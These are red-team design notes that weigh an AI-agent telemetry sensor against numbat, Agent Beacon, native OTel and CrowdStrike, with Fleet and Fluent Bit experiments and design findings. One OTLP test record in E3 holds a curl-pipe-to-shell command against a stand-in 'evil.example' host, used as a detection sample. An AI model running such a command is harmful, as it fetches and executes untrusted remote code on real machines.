> **Historical design record.** Red-team review of design v0, skeptical-buyer lens (a security architect who already runs Fleet and Fluent Bit; A19, A30, A31, A36, A37 and the thesis). Section E6 holds the npm release count behind decision A31.
>
> - Written on 2026-11-11, during design (the file was last modified 2026-11-11 17:11 UTC on the build machine; its title is dated 2026-11-11).
> - Written under the working name **spoor** (binary `spoor`, rule ids `SPR-...`, osquery tables `spoor_*`, environment prefix `SPOOR_`). The project was renamed hawkbell on 2026-11-12 (commit d261f98), and those became `hawkbell`, `HB-...`, `hawkbell_*` and `HAWKBELL_`.
> - Findings, numbers, plans and file names describe the design, the prototypes and the sources as they were then, not the release. For what the release does, read [docs/ASSUMPTIONS.md](../docs/ASSUMPTIONS.md) and [docs/LIMITATIONS.md](../docs/LIMITATIONS.md).
> - Local paths (`/home/user/...`, `/root/...`, `/tmp/claude-0/...`, `$S/...` for the session scratch directory, and work-directory variables the text defines) name directories on the build machine, a Linux sandbox VM. The scripts, outputs and downloaded sources in them are not in this repository.
> - Redactions: none. Kept: GitHub account and organisation names that are part of a cited repository, package or image location, because a reader needs them to check the source.
> - Below the line the text is the original, unchanged except for the redactions listed. Other records cite these files by line number; such a number counts from the original's first line, which is line 12 of this file.

---

# Red team notes: lens "skeptical-buyer" (2026-11-11)

Persona: security architect at a company that already runs FleetDM and Fluent Bit. Assigned: A19, A30, A31, A36, A37, thesis in sections 1 and 12 of `design/v0.md`.

Working dir for experiments: `$S/rt-buyer/` (S = the session scratchpad). Containers used: `rtbuyer-otel`, `rtbuyer-tail` (both removed). No change was made to the Fleet server, agent options, or the enrolled host.

Environment caveats that limit the evidence:
- `$S/dl/` (fleetctl, osqueryd, fleet binaries named in ENV.md) no longer exists on disk; the Fleet server and osqueryd are still running from deleted inodes. I used the Fleet REST API with the token already stored in `$S/fleetstack/home/.fleet/config` instead of fleetctl.
- I built perplexityai/numbat v0.3.0 from the Go proxy, but this session's permission policy refused to EXECUTE the binary (external code). Every statement about numbat runtime behaviour below is therefore from its primary docs (fetched from raw.githubusercontent.com into `$S/rt-buyer/dl/`), not from a run. The Fluent Bit test used the record shapes printed in numbat's README.
- All commercial-vendor facts are search-derived in `research/paid-vendors.md` ([S] there); I did not re-verify them.

## Experiments actually run

### E1. numbat builds as one CGO-free binary in 33 s
```
GOTOOLCHAIN=auto CGO_ENABLED=0 go install github.com/perplexityai/numbat/cmd/numbat@v0.3.0
real 0m33.204s   -> $S/rt-buyer/bin/numbat, 26,043,661 bytes
proxy.golang.org versions: v0.1.1 v0.1.2 v0.2.0 v0.3.0 (latest 2026-10-19)
go.mod deps: cel-go, klauspost/compress, bbolt, yaml v3, x/sys, protobuf, mvdan.cc/sh/v3
```
Not executed (permission denied by the harness, see above).

### E2. "Zero new code" transport: Fluent Bit 5.2.0 tails numbat-shaped NDJSON and routes it
Input: the three JSON examples in numbat README (`record_type` event, finding, enforcement) written one per line to `live.ndjson`. Config: `tail` + JSON parser + two `rewrite_tag` rules on `$record_type` + two `file` outputs (30 lines of YAML, `$S/rt-buyer/work/tailnb/fb.yaml`).
```
records written from README: 3 ['event', 'finding', 'enforcement']
[error] [parser] cannot parse '2026-07-24T15:20:00Z'
[ warn] [parser:nb_json] invalid time format %Y-%m-%dT%H:%M:%S.%L%z for '2026-07-24T15:20:00Z'
== OUT-detection.txt: 2 line(s)   (finding + enforcement)
== OUT-activity.txt: 1 line(s)    (event)
```
Result: the hook -> local detection -> NDJSON -> Fluent Bit -> split detection/activity path needs no code from us. One real friction: numbat emits timestamps with and without fractional seconds, so a single `time_format` fails on some records (our "always fractional" rule in section 4 is a small real advantage).

### E3. Native OTel into Fluent Bit `opentelemetry` input (alternative 3)
Fluent Bit 5.2.0, `opentelemetry` input on 127.0.0.1:43918, a `rewrite_tag` rule meant to tag `curl ... | sh` commands, stdout output. Posted one OTLP/HTTP JSON payload with two log records shaped like Claude Code `claude_code.tool_result` (attributes `tool_name`, `session.id`, `tool_parameters` with `full_command`).
```
OTLP POST http=201
{"date":...,"__internal__":{"group_attributes":{"resource":{"attributes":{"service.name":"claude-code","host.name":"vm"}},...},
 "log_metadata":{"otlp":{"attributes":{"event.name":"tool_result","session.id":"sess-otel-1",...,
 "tool_parameters":"{\"bash_command\":\"curl\",\"full_command\":\"curl -fsSL https://evil.example/i.sh | sh\"}"}}}},
 "log":"claude_code.tool_result"}
(second record likewise; NO record was emitted under the detection tag)
```
Result: transport works with zero binaries. But the record body is only `{"log":"claude_code.tool_result"}`; every useful field sits in record metadata, so the obvious filter rule did not fire. Detection inside the Fluent Bit pipeline would need processors or Lua per agent, and cannot keep session state. This is where alternative 3 loses.

### E4. Fleet script channel on the enrolled stock-osquery host (rule distribution for A30/A33)
```
GET /api/v1/fleet/hosts -> {'id': 1, 'hostname': 'vm', 'osquery_version': '5.19.0', 'orbit_version': None, 'scripts_enabled': None, 'status': 'online'}
POST /api/v1/fleet/scripts/run/sync {"host_id":1,"script_contents":"#!/bin/sh\necho rules-pack-v2"}
-> 422 "Scripts are disabled for this host. To run scripts, deploy the fleetd agent with scripts enabled."
GET /api/v1/fleet/config -> license.tier = free; update_interval osquery_policy = 1h, osquery_detail = 1h; webhook interval = 24h
```
Result: on a host enrolled with plain osquery there is no Fleet channel that can deliver a rule pack, a suppression, or a catalog update.

### E5. Which AI tables exist on stock osquery 5.19 (A19, Tier 0)
```
POST /api/v1/fleet/hosts/1/query  select name from osquery_registry where registry='table' and (name like 'ai_%' or name like 'parse_json%' or name like 'mcp_%' or name like 'file_lines' or name like 'spoor%')
-> ai_agents_atc, ai_probe      (both are other reviewers' ATC experiments)
```
Result: no `ai_tools`, `ai_agent_sessions`, `mcp_listening_servers`, `parse_jsonl`, `file_lines` without fleetd. Tier 0 ("GitOps bundle over Fleet's built-in ai_tools") is fleetd-only.

### E6. Catalog churn, measured live against registry.npmjs.org
uber/ADR `catalog.json` version 2026.10.12 (37 entries, file last committed 2026-10-16) names 9 distinct npm packages:
```
200 @anthropic-ai/claude-code 2.1.322 bin [claude]
200 @google/gemini-cli 0.68.0 bin [gemini]
404 @google/antigravity-cli            <- does not exist
200 @openai/codex 0.167.1 bin [codex]
200 opencode-ai 1.19.5 bin [opencode]
200 @sourcegraph/amp 0.0.1794412840-g1f3ec2 bin [amp]   (same build also published as @ampcode/cli)
200 @qwen-code/qwen-code 0.27.2 bin [qwen]
200 @kilocode/cli 7.8.27 bin [kilo, kilocode]
200 @github/copilot 1.0.109 bin [copilot]   <- ADR lists binary "github-copilot-cli"
not in ADR: @opencode/cli 2.2.7 bin [opencode, opencode2]
```
Stable releases published in the last 90 / 30 days (npm `time` field):
```
@anthropic-ai/claude-code 80 / 22
@openai/codex             36 / 6
@github/copilot           29 / 13
@google/gemini-cli        13 / 5
total                     158 / 46   (about 1.75 stable releases per day across four of the five "major" agents)
```
Fleet's own identification data (`orbit/pkg/table/ai_tools/internal/classify/kb.json`): plugin_ids 25, jetbrains_ids 10, name_regex 24, cmdline_markers 17, local_ports 3, mcp_capabilities 26, browser_extension_ids 4.

## Primary-source reads that carry the argument

numbat (`$S/rt-buyer/dl/numbat_*.md`):
- Coverage matrix (docs/agent-coverage.md): Claude Code, Codex, Gemini CLI, Cursor, Copilot CLI each have at-rest parser + live hook + pre-action enforcement; Claude/Codex/Gemini also OTLP logs. Matrix covers 28 agents with per-agent version gates (for example Kiro CLI 2.13.0+, Junie 2144.5 EAP, OpenClaw v2026.7.1+).
- docs/rules.md 616-622: "One-shot hook callbacks persist their bounded window in `$HOME/.numbat/state.db`" -> stateful sequence detection at hook time, no daemon.
- docs/deployment.md: "`numbat hook status` verifies only that numbat-owned configuration is present... It does **not** prove that the agent loaded or trusted the hook, that a particular lifecycle event fires, or that a sink acknowledged the resulting record." "A user who owns those artifacts can edit or remove them." "Keep file output enabled and let your existing log forwarder, EDR, or OS retention policy ship and rotate the file." Managed installs still write output to `$HOME/.numbat/live.ndjson`.
- grep counts over README + deployment + coverage + rules + enforcement: `uuid` 0, `host_id|machine_id` 0, `heartbeat` 0, `fluent` 0, `osquery` 0. README records carry `endpoint{hostname,os,arch,username,uid}` only.

Agent Beacon (`$S/rt-buyer/dl/beacon_*`):
- plans.mdx: "Block or require approval for risky actions" and "Fleet rollout (Jamf, Intune, Fleet)" are Enterprise-only; free Beacon Cloud stops analysing after 50 findings (lifetime).
- fleet-deployment.mdx (public): root-owned runtime log readable only by root and a `beacon-log` group; `BEACON_LOG_READERS` names the log shipper account; hook events recorded under the OS-attested account; settings read from `/etc/default/beacon`, profile domain `com.beacon.endpoint`, `HKLM\SOFTWARE\Policies\Beacon\Endpoint`; signed apt repo with pinned key hash.
- grep counts in README + architecture + fleet-deployment: `osquery` 0, `fluent` 0, `kubernetes|daemonset` 0.

fleetd (`/home/user/fleetdm/fleet` @ 27178c8c):
- `orbit/pkg/table/extension.go:180,198,204-205` registers `parse_jsonl`, `ai_tools`, `ai_agent_sessions`, `ai_agent_session_messages`.
- `ai_agent_sessions/tables.go`: agents `claude_code, copilot_cli, cursor, codex_cli, gemini_cli` (the same five as our design). Messages table columns include `tool_name, tool_use_id, action, target, decision, cwd, timestamp`.
- `schema/tables/ai_agent_session_messages.yml`: "Query it on demand, constrained to a `session_id`; don't schedule it unconstrained"; ~1 MiB result cap; `evented: false`.
- `orbit/CHANGELOG.md`: `ai_tools` added 1.59.0, tuned in 1.63.0 (2026-10-30) "so it can run hourly on every host"; session tables are not in the changelog (unreleased).
- `ai_tools/README.md`: no occurrence of "hook" or "skill".

Design text checks:
- `design/v0.md` contains no packaging or code-signing plan (grep for pkg/msi/deb/notar/Authenticode finds only "signed packs" for rules in A33).
- Section 3 lists three sources (hooks, transcripts, process). There is no OTLP receiver, although `research/agent-surfaces-a.md` (summary point 3, recommendation 5) says to triangulate hooks, transcript tail and native OTel.

## The four alternatives, argued at full strength

1. numbat `--managed` + fleetd `ai_tools` / `ai_agent_sessions` + Fluent Bit tail, zero new code. Gives: managed hooks for 28 agents, on-endpoint CEL and sequence rules with persisted state, opt-in blocking, NDJSON that Fluent Bit routes with 30 lines of YAML (E2), inventory with 15 risk flags, session summaries for five agents, Fleet policies in plain SQL. Where our design loses to it: breadth (28 vs 5), time to value (33 s build, one command per agent), a real shell parser already shipped, corporate backer. Where it loses to our design (all from numbat's own docs): no proof the hook ran or the record shipped, user-owned output and state files, no rotation contract, no heartbeat, no host UUID to join with Fleet, no process or container view, findings are not queryable in Fleet unless you hand-write `parse_jsonl` over per-user paths on fleetd, nothing at all on stock osquery (E5).
2. Agent Beacon. Wins: signed and notarized pkg, signed apt repo with provenance, MSI + service, 29 runtimes, browser extension, CI wrapper, OS-attested per-person attribution, root-only log with a shipper group. Loses: rule evaluation is batch `beacon scan`, blocking and "Fleet rollout" are Enterprise-only, cross-machine view is SaaS with a 50-finding free cap, bundles Vector rather than Fluent Bit, no osquery or Kubernetes content.
3. Native OTel pinned by managed settings into Fluent Bit. Wins: zero binaries on the endpoint for Claude Code, Codex and Gemini; vendor-supported; destination cannot be overridden by project settings; carries events hooks do not (`api_request`, `permission_mode_changed`, `mcp_server_connection`, `plugin_installed`, `skill_activated`, `hook_execution_start/complete`, `managed_settings_resolved`, `app.entrypoint`). Loses: no Cursor (no OTel found), Copilot is traces and metrics only, no detection and no session state in the pipeline (E3), content gates default off.
4. CrowdStrike for a Falcon shop. Wins: kernel process, file and network ground truth, blocking of agent binaries, MCP proxy, browser and SaaS collectors, reputation corpus, one console, support contract. Loses (per [S] research): Claude Code coverage is the same hook mechanism, Linux pre-beta, nothing for containers or CI, closed schema and rules, vendor SIEM, and the Agents SKU reportedly closed to new purchase since 2026-09-01.

## Findings (most damaging first)

SB-1 (A30, broken, high). "Rule updates and policy distribution are covered by Fleet." E4: Fleet 4.94.1 answers 422 "Scripts are disabled for this host" on the enrolled stock-osquery host. `research/fleet.md` sections 1, 4, 5, 9: scripts need fleetd packaged with `--enable-scripts`; software deploy, policy automations, label-targeted reports and TUF extensions are Premium; ad hoc script text is under 10,000 characters; scripts queue until the next check-in; policies evaluate hourly; webhooks default to 24h (confirmed on the live config). So a false-positive storm (Uber's production rate was 49% FP, `research/adr-paper.md`) cannot be suppressed fleet-wide in a bounded time, there is no convergence signal, no rollback, and per-team exceptions need Premium labels or N script variants. Change: the sensor pulls a signed, monotonic-versioned bundle (rules + suppressions + catalog) from an operator-supplied static HTTPS URL (S3, GCS, git raw, any web server), ETag-polled with jitter; `rules_version` and `rules_sha256` go into every detection, the heartbeat, and `spoor_health`, so one Fleet policy and one SIEM query prove convergence; suppressions are a first-class file in the bundle scoped by rule id + repo/user/host-label facts evaluated on the endpoint. A static file is not a server.

SB-2 (A36, broken, high). The premise "28 agents shallowly" is false. numbat's matrix gives the same five agents at-rest parser + hook + enforcement (+ OTLP for three), managed-tier paths, and stateful sequence rules persisted across one-shot hook calls (rules.md 616-622). E1: it is one CGO-free binary built in 33 s. E2: its record shapes flow through Fluent Bit with config only. One of our five (Gemini CLI) was replaced for consumer plans by Antigravity CLI on 2026-06-18 (`research/agent-surfaces-b.md`), which numbat already lists. Change: make the pipeline input-pluggable and ship `numbat` (schema 0.5.0 NDJSON) and `beacon` (`runtime.jsonl`) adapters in v1; keep a native hook handler only for the three agents that share one wire contract (Claude Code, Codex, Copilot CLI) and only because the daemon socket, root-owned spool and peer-credential attribution need it; drop Gemini and Cursor dialects from v1.

SB-3 (thesis sections 1 and 12, broken as written, high). Section 1 still says incumbents are three camps and that none gives a real-time vendor-neutral signal; section 12 lists a fourth camp that does. The section 12 claim that nobody ships "streaming on-endpoint detection" is contradicted by numbat's hook-time sequence engine. What survives is narrower: nobody proves the telemetry is complete (numbat: status "does not prove that the agent loaded or trusted the hook"), nobody corroborates with the OS, nobody exposes findings and coverage in osquery, nobody covers Kubernetes. Change: restate the thesis as "the assurance and integration layer for agent telemetry on Fleet + Fluent Bit: proves coverage, corroborates, detects, and delivers, from its own hooks or from numbat, Beacon or native OTel", and delete "turns every agent action into an event" as the headline.

SB-4 (A37 unstated, broken, high). The design has no packaging or code-signing plan; a root daemon and a per-tool-call hook binary that are unsigned will not pass my change board (Gatekeeper, WDAC/AV, EDR prevalence rules). Beacon already ships signed + notarized pkg and a signed apt repo with provenance; `research/small-oss.md` section 8 row 1 names signed packages (incl. arm64 MSI) as the first bar. Change: put packaging in v1 scope: deb/rpm via nfpm, notarized pkg, MSI with Authenticode, cosign-signed checksums + provenance + SBOM, and Fleet Free install scripts that verify the signature before install. If no signing identity exists at launch, state it and ship reproducible builds plus cosign verification.

SB-5 (A19, weakened, high). Four of eight planned tables duplicate fleetd: `spoor_agents` and `spoor_mcp_servers` vs `ai_tools` (15 risk flags already cover bypass, unpinned, plaintext secret, hidden Unicode, injection markers), `spoor_sessions` vs `ai_agent_sessions` (same five agents), much of `spoor_posture` vs `risk_flags`. Fleet's October 2026 roadmap adds skills in software inventory, sessions per host and AI dashboards. But E5 shows none of Fleet's tables exist on stock osquery, and fleetd has no rows for hooks, skills, plugins, detections or sensor health. Change: on fleetd hosts ship reports and policies over Fleet's tables and do not create `spoor_agents`, `spoor_mcp_servers`, `spoor_sessions`; always ship `spoor_detections`, `spoor_health` (per-agent hook coverage state), `spoor_extensions`, `spoor_agent_processes`; enable the duplicate tables only behind a `--stock-osquery` profile; send catalog and risk-flag deltas upstream to fleetd.

SB-6 (A30, weakened, high). Fleet-wide correlation and cross-host hunting have no owner. Fleet keeps only the latest result per host, 1,000 rows per report, 512 KiB per host, live queries reach online hosts only (`research/fleet.md` section 10); `spoor_detections` is per-host SQLite with retention caps; section 6 and A21 send only detections to the SIEM and activity to cold object storage in metadata-only form. So "which hosts loaded skill hash X or called MCP server Y in the last 14 days" and "same payload hash on 40 hosts in an hour" are unanswerable without rehydration. Uber had Hive/Presto and an index for this (`research/adr-paper.md` section 1). Change: add a `rollup` stream, one compact record per session end or 15 minutes (agent, session, repo hash, tool-kind counts, distinct egress hosts, MCP servers, skill/plugin hashes, detection ids, coverage state), sized for SIEM indexing; ship prevalence and campaign correlation content for the SIEM (Sigma correlation rules plus two native examples) and a SQL pack that queries the NDJSON segments in object storage.

SB-7 (A31, weakened, medium). E6: four of the five target agents shipped 158 stable releases in 90 days; a one-month-old 37-entry catalog already has a nonexistent npm name, a wrong binary name and a missing major package, and `research/agent-surfaces-b.md` lists more (bundle ids, brew names) plus six renames between June and November 2026. Fleet's own knowledge base is 24 name regexes and changes only with fleetd releases. An embedded catalog of 80 hand-edited entries will be wrong within weeks and a fix needs a binary redeploy. Change: catalog is signed data in the SB-1 bundle; generated in CI from Homebrew casks/formulae, npm, PyPI, winget and Scoop metadata with a nightly verifier that fails on 404 or rename; every entry carries `verified_at`, `sources`, `status`, `renamed_from`; replace the ">= 80 products" goal with "100% of entries verified within 30 days"; two tiers (five agents CI-tested weekly against current releases; everything else identity-only).

SB-8 (section 3 unstated assumption, weakened, medium). The design omits the one telemetry surface the vendors support and admins can pin: native OTel. E3 shows Fluent Bit alone cannot detect on it, so the edge engine is justified, but v0 has no OTLP receiver while numbat and Beacon both do. Claude Code's `hook_execution_start/complete` and `managed_settings_resolved` events are a direct, vendor-emitted check that our hook ran, which is a stronger bypass oracle than diffing transcripts. Change: add a loopback OTLP/HTTP logs receiver to `spoor run` as a fourth source; `spoor hooks install` also writes the managed OTel settings for Claude Code, Codex and Gemini; the coverage correlator compares `hook_execution_complete` counts with received hook events.

SB-9 (A37 unstated, weakened, medium). The design assumes the buyer has no EDR. Almost every Fleet shop has one, and against Falcon or Defender a polling process monitor is the weaker copy. The envelope carries only `agent.pid`; a PID is not a join key. Change: every hook event carries `process{pid, start_time, exe_path, exe_sha256, parent chain}` captured at hook time from the caller (the hook is a child of the agent, so this is exact where polling is lossy); ship join recipes for Falcon, Defender and osquery evented tables; describe the polling monitor as a fallback for hosts without EDR.

SB-10 (A37, weakened, medium). Three listed differentiators are content, not code: the Fleet GitOps bundle, the Fluent Bit configs (E2 took 30 lines) and privacy tiers (numbat has content-capture modes, Beacon is metadata/hash-only by default). numbat went v0.1.1 to v0.3.0 by 2026-10-19 and Fleet has sessions and dashboards on its roadmap. Defensible items need a root daemon and an OS view: coverage correlator, health and coverage tables, Kubernetes DaemonSet, root-owned spool, benchmark corpus. Change: build those first; publish the Fleet and Fluent Bit content as tool-agnostic packs that also work over numbat, Beacon and fleetd outputs, and upstream them (Fleet query library, Fluent Bit docs) so the project is the reference integration rather than a competing sensor.

SB-11 (A37 core, holds, low). I tried to find an existing open-source equivalent of the coverage and health layer and failed: numbat docs say status proves configuration only and contain no heartbeat, host UUID, osquery or Fluent Bit content (grep counts 0); Beacon's architecture doc declares no process monitoring and has no osquery, Fluent Bit or Kubernetes content (0); fleetd's `ai_tools` README never mentions hooks or skills; E5 shows nothing on stock osquery. Keep `spoor_health` + `spoor_detections` + the correlator as the centre of v1.

## Decision as the buyer

Cut or replace with interop:
- Hook dialects and transcript tailers beyond Claude Code, Codex and Copilot CLI: replace with numbat and Beacon input adapters.
- `spoor_agents`, `spoor_mcp_servers`, `spoor_sessions` on fleetd hosts: replace with reports over Fleet's tables.
- Hand-written Forward client in v1 (A15): tail + OTLP cover it; ship later.
- OCSF formatter and LLM `escalate` plumbing in v1: defer.
- The ">= 80 products" embedded catalog: replace with generated signed data and upstream contributions.
- Guard mode in v1: numbat already offers opt-in blocking; ship monitor-only first.

Unique, must be excellent:
- Coverage correlator and per-agent hook state (hooked / unhooked / silent / bypassed) as events and as an osquery table.
- Root-owned daemon spool with segment contract, heartbeat, `seq`, and host identity equal to Fleet's.
- Kubernetes DaemonSet and in-container mode.
- Signed bundle pull for rules, suppressions and catalog with convergence visible in Fleet.
- Open benchmark corpus with benign look-alikes and published false-positive numbers.
- Tested Fleet and Fluent Bit content, including against other sensors' output.

Minimum scope that would make me adopt it:
1. Signed packages for the three OSes and install content that works on Fleet Free.
2. Daemon with root-owned spool, heartbeat and `spoor_health` / `spoor_detections` tables.
3. Inputs: native hooks for three agents, numbat and Beacon NDJSON, native OTLP.
4. Signed bundle pull with version stamped on every detection.
5. Fluent Bit configs tested in CI for my SIEM, plus the rollup stream.
6. Benchmark numbers including false positives on a benign corpus, and an honest coverage matrix.
